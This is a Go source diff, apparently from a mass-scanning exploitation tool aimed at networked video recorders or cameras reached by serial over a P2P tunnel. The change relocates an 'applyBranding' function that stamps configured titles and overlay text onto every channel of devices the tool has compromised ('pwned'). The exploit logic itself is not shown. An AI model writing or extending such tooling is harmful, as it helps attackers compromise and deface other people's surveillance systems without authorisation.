@@ -166,40 +166,11 @@ func (s *Scanner) Run() {
 					break
 				}
 				if !ok {
-	s.mu.Lock()
-	s.SafeCount++
-	s.CompletedCount++
-	s.mu.Unlock()
-}
-
-func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *ExploitResult) {
-	if !s.Config.Brand.Enabled || tunnel == nil || res == nil {
-		return
-	}
-
-	replacePlaceholders := func(tmpl string) string {
-		r := strings.ReplaceAll(tmpl, "{serial}", serial)
-		r = strings.ReplaceAll(r, "{model}", res.Model)
-		return r
-	}
-
-	if s.Config.Brand.ChannelTitle != "" {
-		title := replacePlaceholders(s.Config.Brand.ChannelTitle)
-		for ch := 0; ch < res.Channels; ch++ {
-			tunnel.SetChannelTitle(ch, title)
-		}
-	}
-
-	if len(s.Config.Brand.OverlayText) > 0 {
-		lines := make([]string, len(s.Config.Brand.OverlayText))
-		for i, line := range s.Config.Brand.OverlayText {
-			lines[i] = replacePlaceholders(line)
-		}
-		for ch := 0; ch < res.Channels; ch++ {
-			tunnel.SetOverlayText(ch, lines)
-		}
-	}
-}
+					s.mu.Lock()
+					s.SafeCount++
+					s.CompletedCount++
+					s.mu.Unlock()
+				}
 			}
 		}()
 	}
@@ -240,6 +211,35 @@ cleanup:
 	s.writePwnedFinished()
 	doneTimeStr := time.Now().Format("15:04:05")
 	fmt.Printf("\x1b[32m[%s] Done\x1b[0m\n", doneTimeStr)
+}
+
+func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *ExploitResult) {
+	if !s.Config.Brand.Enabled || tunnel == nil || res == nil {
+		return
+	}
+
+	replacePlaceholders := func(tmpl string) string {
+		r := strings.ReplaceAll(tmpl, "{serial}", serial)
+		r = strings.ReplaceAll(r, "{model}", res.Model)
+		return r
+	}
+
+	if s.Config.Brand.ChannelTitle != "" {
+		title := replacePlaceholders(s.Config.Brand.ChannelTitle)
+		for ch := 0; ch < res.Channels; ch++ {
+			tunnel.SetChannelTitle(ch, title)
+		}
+	}
+
+	if len(s.Config.Brand.OverlayText) > 0 {
+		lines := make([]string, len(s.Config.Brand.OverlayText))
+		for i, line := range s.Config.Brand.OverlayText {
+			lines[i] = replacePlaceholders(line)
+		}
+		for ch := 0; ch < res.Channels; ch++ {
+			tunnel.SetOverlayText(ch, lines)
+		}
+	}
 }
 
 func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
